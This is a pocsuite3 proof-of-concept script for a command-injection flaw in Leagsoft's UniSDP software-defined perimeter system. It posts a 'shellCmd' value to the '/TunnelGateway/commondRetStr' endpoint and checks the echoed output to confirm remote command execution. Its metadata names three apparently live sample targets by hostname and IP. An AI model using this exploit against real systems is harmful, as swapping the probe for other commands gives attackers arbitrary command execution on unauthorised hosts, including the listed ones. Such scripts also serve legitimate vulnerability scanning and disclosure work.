#!/usr/bin/env python
# coding: utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict


class TestPOC(POCBase):
    vulID = '''DSO-06793'''
    cweID = "CWE-78"
    appDevLanguage = ""
    appCategory = ""
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = '''1.0'''
    author = ''''''
    vulDate = '''2022-07-01'''
    createDate = '''2022-07-07'''
    updateDate = '''2022-07-11'''
    name = '''联软 UniSDP软件定义边界系统 commondRetStr 存在命令执行漏洞'''
    desc = '''深圳市联软科技股份有限公司 UniSDP软件定义边界系统 commondRetStr 存在命令执行漏洞，攻击者可利用该漏洞执行系统命令。'''
    solution = '''<p>请关注厂商并更新至安全版本</p> 
<p>厂商链接:&nbsp;<a href="http://www.leagsoft.com/" rel="nofollow">http://www.leagsoft.com/</a></p>'''
    severity = '''high'''
    vulType = '''cmd-exec'''
    taskType = '''app-vul'''
    proto = ['http']
    scanFlag = 1
    tag = ['important']
    references = ['''''']
    appName = '''联软 UniSDP软件定义边界系统'''
    appVersion = '''all'''
    appPowerLink = ''''''
    samples = ['''https://uem.ystwt.com:9090''','''https://112.74.185.112/''','''https://58.58.56.58:7443/''']
    install_requires = ['''''']
    def _attack(self):
        return self._verify()

    def _verify(self):
        target = self.url + "/TunnelGateway/commondRetStr"
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = 'shellCmd=echo%20Test^By^ZsfTest$1By$1Zsf'
        resp = requests.post(url=target, headers=headers, verify=False, data=data, allow_redirects=False, timeout=15)
        if resp.status_code == 200 and 'TestByZsf' in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_verify(result)

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(TestPOC)

